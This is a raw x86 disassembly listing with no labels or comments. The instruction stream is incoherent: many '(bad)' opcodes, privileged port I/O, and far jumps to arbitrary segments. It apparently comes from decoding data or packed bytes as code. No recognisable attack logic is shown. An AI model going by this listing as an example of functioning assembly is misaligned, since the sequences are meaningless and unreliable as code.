  40a98c:	ins    DWORD PTR es:[edi],dx
  40a98d:	out    dx,eax
  40a98e:	mov    eax,0x4e045638
  40a993:	inc    esp
  40a994:	sub    BYTE PTR [edi-0xc327c8e],0x68
  40a99b:	fisttp QWORD PTR [ebx]
  40a99d:	xchg   ebp,eax
  40a99e:	adc    DWORD PTR [eax-0x61],ebp
  40a9a1:	js     0x40aa22
  40a9a3:	in     eax,0xec
  40a9a5:	and    ebp,0x83a0874a
  40a9ab:	mov    al,ds:0x6d3e374d
  40a9b0:	jnp    0x40a959
  40a9b2:	inc    ebp
  40a9b3:	gs jecxz 0x40aa13
  40a9b6:	imul   ebx,DWORD PTR [ebx-0x22ae053f],0xffffffa3
  40a9bd:	test   eax,0x200ef69b
  40a9c2:	and    eax,0xab317ef5
  40a9c7:	test   ecx,edi
  40a9c9:	aam    0xd0
  40a9cb:	sub    bl,BYTE PTR [esi]
  40a9cd:	xlat   BYTE PTR ds:[ebx]
  40a9ce:	shr    BYTE PTR [ecx-0x51],cl
  40a9d1:	or     esi,DWORD PTR [eax-0x7b1ca65e]
  40a9d7:	adc    al,BYTE PTR [edi-0x9]
  40a9da:	loop   0x40a9e4
  40a9dc:	jno    0x40aa53
  40a9de:	jmp    DWORD PTR [ecx-0x70]
  40a9e1:	enter  0x86e6,0x2
  40a9e5:	dec    ebx
  40a9e6:	cmp    al,0x41
  40a9e8:	add    dl,BYTE PTR [edx]
  40a9ea:	pop    DWORD PTR [ebp+0x59]
  40a9ed:	inc    eax
  40a9ee:	dec    edi
  40a9ef:	xor    BYTE PTR [eax-0x65b2074],al
  40a9f5:	into   
  40a9f6:	ins    BYTE PTR es:[edi],dx
  40a9f7:	in     al,0x3e
  40a9f9:	in     al,0x38
  40a9fb:	mov    ah,0x27
  40a9fd:	xor    DWORD PTR [edi],edx
  40a9ff:	stos   DWORD PTR es:[edi],eax
  40aa00:	inc    edx
  40aa01:	pop    edi
  40aa02:	cdq    
  40aa03:	xchg   ebp,eax
  40aa04:	cld    
  40aa05:	mov    gs,WORD PTR [eax-0x53]
  40aa08:	mov    ebx,0x2f48f221
  40aa0d:	(bad)  
  40aa0e:	fxch   st(1)
  40aa10:	push   DWORD PTR [esp+ebx*1-0x28]
  40aa14:	arpl   WORD PTR [edx+0x2c],sp
  40aa17:	inc    esp
  40aa18:	xchg   esi,eax
  40aa19:	int3   
  40aa1a:	out    dx,al
  40aa1b:	xor    BYTE PTR [esi-0x60],ah
  40aa1e:	adc    al,0x54
  40aa20:	pushf  
  40aa21:	hlt    
  40aa22:	sar    BYTE PTR [esi+eax*1+0x776572f6],0x1b
  40aa2a:	ret    0x6d19
  40aa2d:	add    ebx,eax
  40aa2f:	ins    BYTE PTR es:[edi],dx
  40aa30:	daa    
  40aa31:	call   0xf720:0xe66637c9
  40aa38:	jns    0x40aa1a
  40aa3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa3b:	jle    0x40aa59
  40aa3d:	icebp  
  40aa3e:	or     BYTE PTR [edi-0xe],al
  40aa41:	pop    edx
  40aa42:	mov    al,0x22
  40aa44:	mov    eax,0x28c9dfbc
  40aa49:	cmc    
  40aa4a:	push   ebx
  40aa4b:	nop
  40aa4c:	repnz fadd DWORD PTR [ecx-0x6f]
  40aa50:	mov    ebp,0x641b8fae
  40aa55:	push   edi
  40aa56:	xlat   BYTE PTR ds:[ebx]
  40aa57:	adc    BYTE PTR [edi+edx*1-0xe],dh
  40aa5b:	ret    0x1a4e
  40aa5e:	adc    al,0xa0
  40aa60:	xchg   esp,eax
  40aa61:	pop    esi
  40aa62:	sub    eax,DWORD PTR [edi]
  40aa64:	or     BYTE PTR [edi],bh
  40aa66:	sbb    al,0xa3
  40aa68:	jnp    0x40aa45
  40aa6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa6b:	mov    esp,DWORD PTR [edi-0x4fd27711]
  40aa71:	loope  0x40aa73
  40aa73:	mov    ah,al
  40aa75:	cdq    
  40aa76:	jle    0x40aa94
  40aa78:	or     edi,ebx
  40aa7a:	mov    esi,0x92af23cf
  40aa7f:	jle    0x40aa7b
  40aa81:	dec    ebp
  40aa82:	xor    DWORD PTR [eax],edx
  40aa84:	sbb    edi,DWORD PTR [ebx]
  40aa86:	mov    ah,0xe9
  40aa88:	jp     0x40aaef
  40aa8a:	shl    DWORD PTR [ecx],1
  40aa8c:	dec    edi
  40aa8d:	mov    ebp,DWORD PTR [esi-0x62]
  40aa90:	cmp    al,0x66
  40aa92:	scas   al,BYTE PTR es:[edi]
  40aa93:	fsub   QWORD PTR [bx+si-0x2a]
  40aa97:	cmp    eax,0x17595e55
  40aa9c:	call   0xd39b:0xb335cff
  40aaa3:	jle    0x40aa77
  40aaa5:	push   esp
  40aaa6:	xor    al,cl
  40aaa8:	ss xchg ebx,eax
  40aaaa:	push   edi
  40aaab:	popf   
  40aaac:	sar    DWORD PTR [ebx],cl
  40aaae:	in     eax,0xf8
  40aab0:	mov    cl,dh
  40aab2:	lahf   
  40aab3:	(bad)  
  40aab5:	adc    al,0x7c
  40aab7:	xchg   edx,eax
  40aab8:	shl    ch,cl
  40aaba:	mov    eax,ds:0x4c6aeb9b
  40aabf:	cs sbb eax,0x3ea8a1e
  40aac5:	push   edx
  40aac6:	pushf  
  40aac7:	retf   0x62ee
  40aaca:	pop    ds
  40aacb:	jg     0x40aabd
  40aacd:	call   0x6840c94b
  40aad2:	nop
  40aad3:	or     bh,BYTE PTR [edi+eiz*1]
  40aad6:	sar    DWORD PTR [edi-0x7ef648a5],cl
  40aadc:	cwde   
  40aadd:	jnp    0x40aa87
  40aadf:	mov    edx,0x7ea8e7ac
  40aae4:	addr16 hlt 
  40aae6:	mov    ebx,0x2b948fe2
  40aaeb:	push   ebp
  40aaec:	mov    esp,0xc67324a4
  40aaf1:	(bad)  
  40aaf2:	xor    dl,bh
  40aaf4:	inc    edx
  40aaf5:	push   ebp
  40aaf6:	cs shl ch,cl
  40aaf9:	shl    BYTE PTR [edx+0xf],1
  40aafc:	retf   
  40aafd:	ds or  dh,dh
  40ab00:	cdq    
  40ab01:	xor    DWORD PTR [ecx+0xcaebede],eax
  40ab07:	cmp    esi,DWORD PTR [esi+0x3b]
  40ab0a:	addr16 mov bh,0xd
  40ab0d:	jg     0x40ab44
  40ab0f:	into   
  40ab10:	out    dx,al
  40ab11:	mov    eax,ds:0xde5a8232
  40ab16:	xlat   BYTE PTR ds:[ebx]
  40ab17:	aad    0xa5
  40ab19:	jnp    0x9b59236d
  40ab1f:	ss mov ebp,0x1ac2a6d
  40ab25:	mov    ds:0x6198bb27,eax
  40ab2a:	push   0xffffffef
  40ab2c:	cmc    
  40ab2d:	jb     0x40ab81
  40ab2f:	pusha  
  40ab30:	jno    0x40aad4
  40ab32:	in     eax,0x72
  40ab34:	and    ah,BYTE PTR [ecx]
  40ab36:	fld    TBYTE PTR [eax+0x1f]
  40ab39:	div    DWORD PTR [edi+0x74ccf445]
  40ab3f:	mov    edx,0xbb10e4d8
  40ab44:	dec    esi
  40ab45:	call   0x3bb16a64
  40ab4a:	ror    esp,cl
  40ab4c:	mov    bl,dh
  40ab4e:	cmc    
  40ab4f:	scas   eax,DWORD PTR es:[edi]
  40ab50:	sub    eax,0xa7ac7384
  40ab55:	mov    ds:0xe88e7f0a,al
  40ab5a:	clc    
  40ab5b:	sbb    edx,DWORD PTR [eax-0x61814703]
  40ab61:	add    al,0x1
  40ab63:	loop   0x40abcf
  40ab65:	cdq    
  40ab66:	pop    ebp
  40ab67:	jg     0x40ab8e
  40ab69:	call   0xc671:0xeaf2540c
  40ab70:	inc    ebx
  40ab71:	in     al,dx
  40ab72:	ss xchg edi,eax
  40ab74:	fisttp DWORD PTR [ebx+edi*4+0x2ec852d]
  40ab7b:	enter  0x818a,0x81
  40ab7f:	stos   BYTE PTR es:[edi],al
  40ab80:	and    eax,0x6cd3ff68
  40ab85:	pop    ds
  40ab86:	push   ds
  40ab87:	ins    BYTE PTR es:[edi],dx
  40ab88:	scas   al,BYTE PTR es:[edi]
  40ab89:	jmp    0xb90ddd04
  40ab8e:	jle    0x40ab53
  40ab90:	sbb    DWORD PTR [esi+0x5fac5f5a],ecx
  40ab96:	mov    ebx,0xc3b2a834
  40ab9b:	push   cs
  40ab9c:	pand   mm6,QWORD PTR [esp+eax*1]
  40aba0:	(bad)  
  40aba1:	data16 (bad) [ecx*4+0x6fbf7187]
  40aba9:	cmp    eax,0x9df172d4
  40abae:	jae    0x40abe4
  40abb0:	in     eax,dx
  40abb1:	push   edi
  40abb2:	mov    ds:0x4c9f4c0a,al
  40abb7:	pop    ss
  40abb8:	daa    
  40abb9:	inc    edx
  40abba:	mov    eax,ds:0x4e9f0921
  40abbf:	jmp    0x40ac1f
  40abc1:	scas   al,BYTE PTR es:[edi]
  40abc2:	stos   DWORD PTR es:[edi],eax
  40abc3:	cwde   
  40abc4:	mov    bl,0x49
  40abc6:	stos   DWORD PTR es:[edi],eax
  40abc7:	loope  0x40ab7a
  40abc9:	retf   0xe9f3
  40abcc:	out    dx,eax
  40abcd:	dec    ebx
  40abce:	xchg   di,ax
  40abd0:	test   DWORD PTR [edi+0x7a52d138],esi
  40abd6:	scas   al,BYTE PTR es:[edi]
  40abd7:	scas   al,BYTE PTR es:[edi]
  40abd8:	les    edi,FWORD PTR [esp+ebp*2-0x21c3d6c1]
  40abdf:	mov    eax,DWORD PTR [edx-0x35]
  40abe2:	push   ss
  40abe3:	xchg   edi,eax
  40abe4:	xchg   BYTE PTR ds:0x2d4080d6,bl
  40abea:	dec    edx
  40abeb:	imul   ebx,DWORD PTR [ebx],0xb
  40abee:	into   
  40abef:	push   edx
  40abf0:	jl     0x40ac19
  40abf2:	es icebp 
  40abf4:	dec    eax
  40abf5:	mov    ds,eax
  40abf7:	xchg   esp,eax
  40abf8:	jmp    0x864a:0x5db3ba1d
  40abff:	aad    0x34
  40ac01:	fstp   st(0)
  40ac03:	ins    BYTE PTR es:[edi],dx
  40ac04:	and    DWORD PTR [ebp-0x71],ebx
  40ac07:	mov    DWORD PTR [esi],ecx
  40ac09:	pop    ebp
  40ac0a:	mov    eax,ds:0x2a50b338
  40ac0f:	and    al,0xbb
  40ac11:	or     eax,DWORD PTR [edx+0x381dcbb5]
  40ac17:	sbb    BYTE PTR [edi],ch
  40ac19:	sbb    ch,bl
  40ac1b:	loop   0x40abd9
  40ac1d:	pop    ebx
  40ac1e:	call   0xa65d:0x37ab943d
  40ac25:	lods   al,BYTE PTR ds:[esi]
  40ac26:	cmp    BYTE PTR [edx+0x49ccfc43],ah
  40ac2c:	mov    edx,0xbf6b2f82
  40ac31:	mov    WORD PTR [esi],?
  40ac33:	dec    ebx
  40ac34:	imul   edx,DWORD PTR [ebp+0xdd1b034],0x80d8e171
  40ac3e:	outs   dx,DWORD PTR ds:[esi]
  40ac3f:	pop    esi
  40ac40:	inc    ebp
  40ac41:	and    DWORD PTR [eax-0x26],ebp
  40ac44:	imul   ebx,DWORD PTR [esp+eiz*2-0x42],0x72b661ef
  40ac4c:	xchg   edx,eax
  40ac4d:	mov    edi,0xa9a32766
  40ac52:	call   0xbcff5d8f
  40ac57:	jl     0x40aca3
  40ac59:	and    dh,0x1a
  40ac5c:	pop    esp
  40ac5d:	xchg   edi,eax
  40ac5e:	jo     0x40abf8
  40ac60:	push   ss
  40ac61:	ins    DWORD PTR es:[edi],dx
  40ac62:	loop   0x40ac28
  40ac64:	sar    BYTE PTR [ecx-0x21],0xd5
  40ac68:	jne    0x40acbd
  40ac6a:	sub    eax,0xc65eaf2
  40ac6f:	xchg   ebx,eax
  40ac70:	test   eax,0x49482579
  40ac75:	popf   
  40ac76:	inc    ebx
  40ac77:	(bad)  
  40ac78:	aaa    
  40ac79:	ss inc edx
  40ac7b:	iret   
  40ac7c:	mov    esp,0xc1ade8fd
  40ac81:	repnz nop
  40ac83:	arpl   si,ax
  40ac85:	xor    ebp,DWORD PTR [ebp+0x49]
  40ac88:	fistp  QWORD PTR [ecx+0x6008b11a]
  40ac8e:	pop    ds
  40ac8f:	jl     0x40ac69
  40ac91:	xor    ch,bh
  40ac93:	bound  esp,QWORD PTR [ebp-0x21856541]
  40ac99:	mov    al,ds:0xb67388d8
  40ac9e:	ss sub eax,0xd4d0b77a
  40aca4:	sbb    bh,ch
  40aca6:	pop    ss
  40aca7:	mov    bl,0xb3
  40aca9:	mov    edx,0x8dcb905b
  40acae:	mov    ecx,0x3969a35b
  40acb3:	mov    ds:0xf8091bb9,eax
  40acb8:	push   edi
  40acb9:	(bad)  [ebp+0x14b6b858]
  40acbf:	push   ecx
  40acc0:	stos   BYTE PTR es:[edi],al
  40acc1:	mov    edx,DWORD PTR [edi+0x59]
  40acc4:	jmp    0x87ae:0x4b3aef17
  40accb:	shr    DWORD PTR [eax],cl
  40accd:	or     eax,0x2b6e46c1
  40acd2:	(bad)  
  40acd3:	into   
  40acd4:	sbb    DWORD PTR ds:0x54a91b63,esp
  40acda:	jecxz  0x40ad58
  40acdc:	stos   BYTE PTR es:[edi],al
  40acdd:	rcl    eax,1
  40acdf:	outs   dx,DWORD PTR ds:[esi]
  40ace0:	add    ebx,0x9d020732
  40ace6:	into   
  40ace7:	jmp    0xdc6a8287
  40acec:	cmp    al,0x63
  40acee:	ja     0x40ad03
  40acf0:	and    bl,bh
  40acf2:	aaa    
  40acf3:	inc    ecx
  40acf4:	imul   ebx,DWORD PTR [ebx+0x20],0x4a
  40acf8:	daa    
  40acf9:	in     eax,dx
  40acfa:	ret    0x2002
  40acfd:	jle    0x40acf0
  40acff:	iret   
  40ad00:	fld    TBYTE PTR [edi+0x27]
  40ad03:	cmp    DWORD PTR [esi+eax*2+0x158a08f3],edi
  40ad0a:	or     DWORD PTR [edi+eax*1],esp
  40ad0d:	(bad)  
  40ad0e:	pop    ss
  40ad0f:	stc    
  40ad10:	loopne 0x40ad6d
  40ad12:	mov    edi,0x4d7cf603
  40ad17:	mov    ds:0x37661a8,al
  40ad1c:	rcl    DWORD PTR [edx-0x4d],0xce
  40ad20:	xor    BYTE PTR [esi-0x53],dh
  40ad23:	mov    al,0xa6
  40ad25:	dec    ebp
  40ad26:	xchg   ecx,eax
  40ad27:	test   ecx,edi
  40ad29:	loopne 0x40acb6
  40ad2b:	lock es cld 
  40ad2e:	xor    BYTE PTR [eax],ah
  40ad30:	and    al,0x70
  40ad32:	call   0x366a4f7d
  40ad37:	pop    esp
  40ad38:	add    eax,0x6623d7b1
  40ad3d:	jl     0x40adb6
  40ad3f:	push   esi
  40ad40:	ins    BYTE PTR es:[edi],dx
  40ad41:	mov    cl,0x36
  40ad43:	mov    ch,0x9c
  40ad45:	jbe    0x40acde
  40ad47:	xor    al,0xba
  40ad49:	pop    ss
  40ad4a:	jns    0x40adc4
  40ad4c:	bswap  ecx
  40ad4e:	mov    ebp,0xd1cd2824
  40ad53:	add    edi,edi
  40ad55:	xor    dh,bl
  40ad57:	xor    bh,BYTE PTR [ebx+0x59]
  40ad5a:	sar    al,cl
  40ad5c:	loop   0x40ad65
  40ad5e:	sub    al,0x45
  40ad60:	mov    al,ds:0xa4d0cbf
  40ad65:	shl    bl,cl
  40ad67:	lods   eax,DWORD PTR ds:[esi]
  40ad68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad69:	mov    ds:0xbf31dcbe,al
  40ad6e:	adc    DWORD PTR [esi-0x3b9421c0],eax
  40ad74:	outs   dx,BYTE PTR ds:[esi]
  40ad75:	pusha  
  40ad76:	addr16 jl 0x40ade1
  40ad79:	repnz cmp BYTE PTR [eax+esi*8],al
  40ad7d:	ja     0x40adef
  40ad7f:	sub    DWORD PTR [edi+0x7eb1ee10],eax
  40ad85:	dec    ebp
  40ad86:	add    DWORD PTR [eax+eiz*8],eax
  40ad89:	mov    ebp,0x97f4843c
  40ad8e:	sub    ebp,DWORD PTR [ecx+0x71]
  40ad91:	fidivr DWORD PTR [ebp+0x31]
  40ad94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad95:	xor    BYTE PTR [eax],bh
  40ad97:	push   ecx
  40ad98:	lock hlt 
  40ad9a:	fstp   QWORD PTR [ebp+0x77]
  40ad9d:	pop    eax
  40ad9e:	and    edx,DWORD PTR [esi+ecx*2]
  40ada1:	adc    esp,DWORD PTR [ecx+ebp*4-0x5c088893]
  40ada8:	adc    eax,0xb3a7e007
  40adad:	mov    esp,0x8f9aa963
  40adb2:	dec    edx
  40adb3:	mov    esp,DWORD PTR [esi]
  40adb5:	and    eax,0x47ac6e79
  40adba:	imul   edx,DWORD PTR [edx-0x24a14943],0x3d
  40adc1:	mov    al,ds:0x7f0061eb
  40adc6:	sbb    al,0x94
  40adc8:	in     eax,0xf
  40adca:	or     ah,BYTE PTR [edx-0x510c9e4b]
  40add0:	cmp    eax,0x82b0c25b
  40add5:	cmp    bh,BYTE PTR [edi+0xf40c476]
  40addb:	inc    edx
  40addc:	popa   
  40addd:	cmp    BYTE PTR [edx],bh
  40addf:	mov    al,ds:0xaab98525
  40ade4:	les    ebp,FWORD PTR [esp+eax*1-0xa8c1ab9]
  40adeb:	jmp    0x9771:0x350922db
  40adf2:	mov    edx,0x5aefb65d
  40adf7:	mov    dh,0x58
  40adf9:	xchg   ecx,eax
  40adfa:	aaa    
  40adfb:	int3   
  40adfc:	xchg   ecx,eax
  40adfd:	(bad)  
  40adfe:	push   cx
  40ae00:	dec    edx
  40ae01:	xrelease mov BYTE PTR [edi],bl
  40ae04:	mov    ecx,0xa7eb5bf5
  40ae09:	mov    edx,0x267372d
  40ae0e:	iret   
  40ae0f:	push   esi
  40ae10:	test   eax,0x42dd06d4
  40ae15:	dec    edi
  40ae16:	sbb    bl,BYTE PTR [esi]
  40ae18:	sar    BYTE PTR [eax-0x16],cl
  40ae1b:	in     eax,dx
  40ae1c:	mov    bl,0x9a
  40ae1e:	adc    DWORD PTR [esi],esp
  40ae20:	adc    ebp,esp
  40ae22:	xchg   ecx,eax
  40ae23:	les    eax,FWORD PTR [edx]
  40ae25:	cli    
  40ae26:	mov    ds,WORD PTR [ebx+edi*1-0x49]
  40ae2a:	dec    esp
  40ae2b:	sbb    esi,ecx
  40ae2d:	jmp    0x1d6e:0xe863b59b
  40ae34:	jnp    0x40adee
  40ae36:	out    dx,al
  40ae37:	or     DWORD PTR [edx],edx
  40ae39:	xchg   esi,eax
  40ae3a:	push   ds
  40ae3b:	int    0xa9
  40ae3d:	in     eax,dx
  40ae3e:	push   edi
  40ae3f:	mov    ss,ebp
  40ae41:	outs   dx,DWORD PTR ds:[esi]
  40ae42:	rcr    DWORD PTR [esi+0x6e],cl
  40ae45:	jns    0x40ae75
  40ae47:	or     BYTE PTR [ecx-0x8478b17],0xae
  40ae4e:	or     DWORD PTR [edi],edi
  40ae50:	or     bh,BYTE PTR [eax-0x13]
  40ae53:	cmp    BYTE PTR [eax+0x75],0x5e
  40ae57:	xchg   ebp,eax
  40ae58:	ins    BYTE PTR es:[edi],dx
  40ae59:	in     eax,0xa9
  40ae5b:	xor    ch,BYTE PTR [esi-0x7716a7f7]
  40ae61:	push   edi
  40ae62:	pop    ebp
  40ae63:	js     0x40aeb7
  40ae65:	xchg   BYTE PTR [eax],dh
  40ae67:	stos   DWORD PTR es:[edi],eax
  40ae68:	mul    DWORD PTR [ecx+0x26]
  40ae6b:	shl    BYTE PTR [edx],1
  40ae6d:	xchg   ebx,eax
  40ae6e:	add    BYTE PTR [eax+esi*1],0x2
  40ae72:	mov    cl,0xb3
  40ae74:	mov    eax,0xd9a4444f
  40ae79:	adc    al,0xe2
  40ae7b:	adc    DWORD PTR [eax],0x41
  40ae7e:	push   ecx
  40ae7f:	mov    al,0xc9
  40ae81:	stos   DWORD PTR es:[edi],eax
  40ae82:	clc    
  40ae83:	std    
  40ae84:	mov    DWORD PTR [ebp-0x1839e4d7],0x18e0f145
  40ae8e:	or     esp,DWORD PTR [ebx+0x4a]
  40ae91:	mov    edi,0x458d47b
  40ae96:	pop    ebx
  40ae97:	and    eax,0x2cc107e7
  40ae9c:	pop    ecx
  40ae9d:	(bad)
  40aea1:	cmp    al,0xce
  40aea3:	daa    
  40aea4:	in     al,dx
  40aea5:	and    eax,0x35afa180
  40aeaa:	in     eax,0x70
  40aeac:	xchg   ebp,eax
  40aead:	fld    st(1)
  40aeaf:	cmp    DWORD PTR [ebp+0x4e],0xca269404
  40aeb6:	xor    eax,0x85db0511
  40aebb:	loope  0x40af0c
  40aebd:	add    ebp,DWORD PTR [ebp+0x62]
  40aec0:	push   ecx
  40aec1:	dec    eax
  40aec2:	aas    
  40aec3:	gs aas 
  40aec5:	jno    0x40ae8b
  40aec7:	or     al,0x12
  40aec9:	push   DWORD PTR [edi]
  40aecb:	xlat   BYTE PTR ds:[ebx]
  40aecc:	jae    0x40aefc
  40aece:	mov    ds:0xd45c4411,al
  40aed3:	out    0x70,al
  40aed5:	int    0xd3
  40aed7:	sbb    esi,DWORD PTR [esp+eiz*2]
  40aeda:	pop    esp
  40aedb:	pop    ebp
  40aedc:	stos   BYTE PTR es:[edi],al
  40aedd:	stos   DWORD PTR es:[edi],eax
  40aede:	pop    es
  40aedf:	shl    bh,0x1b
  40aee2:	popf   
  40aee3:	xchg   BYTE PTR [esi-0x1b],bl
  40aee6:	push   ebx
  40aee7:	mov    dl,0x5
  40aee9:	mov    dh,0x88
  40aeeb:	add    al,0x81
  40aeed:	mov    dl,0x1a
  40aeef:	mov    bl,0xf2
  40aef1:	ss push esi
  40aef3:	pop    ebx
  40aef4:	jle    0x40af64
  40aef6:	cs jp  0x40af3d
  40aef9:	inc    esi
  40aefa:	mov    bh,0x94
  40aefc:	jmp    0xa9a1377e
  40af01:	loopne 0x40af5d
  40af03:	cwde   
  40af04:	mov    al,ds:0xef9b28a1
  40af09:	popf   
  40af0a:	adc    al,0xb2
  40af0c:	pushf  
  40af0d:	cld    
  40af0e:	xchg   edi,eax
  40af0f:	clc    
  40af10:	jecxz  0x40af6b
  40af12:	inc    ebp
  40af13:	fidiv  WORD PTR [ecx+0x29]
  40af16:	xchg   ebp,eax
  40af17:	inc    ecx
  40af18:	dec    esp
  40af19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af1a:	shr    ch,0xc0
  40af1d:	mov    ch,BYTE PTR [ecx-0x2d02c89d]
  40af23:	sbb    eax,0xe989f2a
  40af28:	push   0x248cf58a
  40af2d:	ins    BYTE PTR es:[edi],dx
  40af2e:	(bad)  
  40af2f:	xlat   BYTE PTR ds:[ebx]
  40af30:	dec    ecx
  40af31:	mov    eax,0xf0f71b0a
  40af36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af37:	xor    BYTE PTR [edi+0x4936061f],ch
  40af3d:	add    DWORD PTR [ecx],0xcfcce7ea
  40af43:	in     al,dx
  40af44:	cmp    al,0x10
  40af46:	cmp    DWORD PTR [eax],0x12
  40af49:	(bad)  
  40af4a:	or     eax,DWORD PTR [ebp-0x5bdd36b7]
  40af50:	pushf  
  40af51:	mov    dh,0x51
  40af53:	cmp    eax,0x47c1bb81
  40af58:	les    esi,FWORD PTR [ecx+0x34d1eb69]
  40af5e:	scas   eax,DWORD PTR es:[edi]
  40af5f:	aad    0x22
  40af61:	xor    dh,dh
  40af63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af64:	cmc    
  40af65:	jecxz  0x40af1d
  40af67:	or     ch,BYTE PTR [ecx-0x69]
  40af6a:	icebp  
  40af6b:	xor    edx,DWORD PTR [ecx+0xd]
  40af6e:	mov    eax,ds:0xb49ad4bb
  40af73:	xchg   esi,eax
  40af74:	xchg   ecx,eax
  40af75:	xchg   edx,eax
  40af76:	cs inc edi
  40af78:	aad    0x2a
  40af7a:	(bad)  
  40af7b:	(bad)  
  40af7c:	fimul  DWORD PTR [edx-0x27]
  40af7f:	out    0xae,al
  40af81:	xchg   edi,eax
  40af82:	pop    ds
  40af83:	mov    ds:0x8ab628f4,al
  40af88:	push   ebx
  40af89:	call   FWORD PTR [ebx-0x1b]
  40af8c:	jbe    0x40afa9
  40af8e:	aam    0x3a
  40af90:	jl     0x40af5f
  40af92:	xchg   ebp,eax
  40af93:	in     eax,dx
  40af94:	std    
  40af95:	pop    edi
  40af96:	jmp    0x40afac
  40af98:	dec    ebx
  40af99:	mov    bl,0x51
  40af9b:	adc    bh,BYTE PTR [esi]
  40af9d:	mov    edi,0x905b76a8
  40afa2:	(bad)  
  40afa3:	fidiv  WORD PTR [edx*2-0x2ed31fff]
  40afaa:	push   esi
  40afab:	stos   DWORD PTR es:[edi],eax
  40afac:	cmp    bh,BYTE PTR [edi-0xc2df015]
  40afb2:	push   ds
  40afb3:	pushf  
  40afb4:	shr    DWORD PTR [ecx-0x244c84c3],cl
  40afba:	cwde   
  40afbb:	(bad)  
  40afbc:	xchg   ecx,eax
  40afbd:	(bad)  
  40afbe:	add    eax,0xd6a95b9e
  40afc3:	xchg   ecx,eax
  40afc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afc5:	ins    BYTE PTR es:[edi],dx
  40afc6:	add    DWORD PTR [ecx-0x69],0x29
  40afca:	cli    
  40afcb:	stos   BYTE PTR es:[edi],al
  40afcc:	pop    eax
  40afcd:	jnp    0x40af88
  40afcf:	adc    DWORD PTR [esi+esi*4-0x5e86595d],esi
  40afd6:	not    DWORD PTR [ecx-0x2e233162]
  40afdc:	lock pop edx
  40afde:	arpl   WORD PTR [edi+0x5faa3e3],dx
  40afe4:	leave  
  40afe5:	mov    bl,0xbb
  40afe7:	mov    ebp,0x422bc542
  40afec:	stc    
  40afed:	shl    BYTE PTR [edi-0x5e],0xb9
  40aff1:	daa    
  40aff2:	mov    edi,0xde9f3550
  40aff7:	mov    ds:0xc5698acc,eax
  40affc:	push   esp
  40affd:	into   
  40affe:	push   ebx
  40afff:	jae    0x40b023
  40b001:	push   esp
  40b002:	mov    ebp,0xa325c510
  40b007:	jmp    0xbe0a:0x9cf62beb
  40b00e:	(bad)  
  40b00f:	repnz add cl,BYTE PTR [edx-0xf]
  40b013:	leave  
  40b014:	jle    0x40b089
  40b016:	jns    0x40b00c
  40b018:	fisubr DWORD PTR [eax-0x25]
  40b01b:	or     al,cl
  40b01d:	mov    edi,0xd1fb9693
  40b022:	mov    edi,0x1602f62f
  40b027:	stc    
  40b028:	aas    
  40b029:	repz jae 0x40b093
  40b02c:	xchg   esi,eax
  40b02d:	adc    DWORD PTR [ebx-0x6499b3b4],0xed36642f
  40b037:	mov    al,ds:0x2bdfcafa
  40b03c:	add    eax,0x581841f9
  40b041:	fbld   TBYTE PTR [edx+0x7b]
  40b044:	mov    bh,BYTE PTR [esi+ebp*4+0xb]
  40b048:	loopne 0x40b099
  40b04a:	ins    DWORD PTR es:[edi],dx
  40b04b:	ins    BYTE PTR es:[edi],dx
  40b04c:	sub    ah,BYTE PTR [eax]
  40b04e:	in     eax,dx
  40b04f:	add    BYTE PTR [edi+0x3bec757c],bh
  40b055:	mov    bl,0xe2
  40b057:	adc    eax,0xf3adf955
  40b05c:	outs   dx,BYTE PTR ds:[esi]
  40b05d:	mov    ?,WORD PTR [esi+0x6f]
  40b060:	and    eax,0x4bd0418c
  40b065:	mov    ds:0xb33dbf26,al
  40b06a:	daa    
  40b06b:	rcr    DWORD PTR [ecx],0x30
  40b06e:	scas   eax,DWORD PTR es:[edi]
  40b06f:	xchg   BYTE PTR [eax],al
  40b071:	das    
  40b072:	mov    edx,0x59e5c3d0
  40b077:	dec    ecx
  40b078:	inc    eax
  40b079:	shl    DWORD PTR [ecx+0x63541ef1],1
  40b07f:	and    eax,0xd3de95e
  40b084:	adc    al,0xd5
  40b086:	lock outs dx,BYTE PTR ds:[esi]
  40b088:	inc    edx
  40b089:	(bad)
  40b08d:	fwait
  40b08e:	xchg   esi,eax
  40b08f:	int    0x5e
  40b091:	xor    DWORD PTR [ebp+0x55],esi
  40b094:	imul   ebx,DWORD PTR [esi-0x1c359057],0x56807317
  40b09e:	jmp    0x40b07f
  40b0a0:	out    dx,al
  40b0a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0a2:	xchg   DWORD PTR ds:0xdcacccb1,eax
  40b0a8:	push   ebx
  40b0a9:	gs out dx,al
  40b0ab:	add    cl,BYTE PTR [esi]
  40b0ad:	pop    esi
  40b0ae:	in     al,dx
  40b0af:	stos   BYTE PTR es:[edi],al
  40b0b0:	sub    eax,0x6d811925
  40b0b5:	loop   0x40b132
  40b0b7:	stos   BYTE PTR es:[edi],al
  40b0b8:	fist   WORD PTR [esi-0x7d]
  40b0bb:	test   al,0x8e
  40b0bd:	push   ss
  40b0be:	fld    QWORD PTR [ebx-0x76ded93e]
  40b0c4:	sbb    eax,0xfc5c6618
  40b0c9:	dec    ecx
  40b0ca:	aam    0x4
  40b0cc:	or     al,0xed
  40b0ce:	mov    cl,BYTE PTR [eax+0x3b]
  40b0d1:	std    
  40b0d2:	or     DWORD PTR [eax],ecx
  40b0d4:	push   edx
  40b0d5:	sub    al,0x7e
  40b0d7:	mov    ecx,0x3df96358
  40b0dc:	xchg   ecx,eax
  40b0dd:	ds daa 
  40b0df:	xchg   esp,eax
  40b0e0:	inc    ecx
  40b0e1:	cmp    DWORD PTR [edi],esp
  40b0e3:	xchg   edi,eax
  40b0e4:	outs   dx,DWORD PTR ds:[esi]
  40b0e5:	push   esp
  40b0e6:	xor    edx,DWORD PTR fs:[edx-0x4c]
  40b0ea:	mov    ds:0xc30f28e0,eax
  40b0ef:	xchg   BYTE PTR [esi+eax*4],cl
  40b0f2:	cs sbb eax,eax
  40b0f5:	repnz add cl,BYTE PTR [esi+ebp*4]
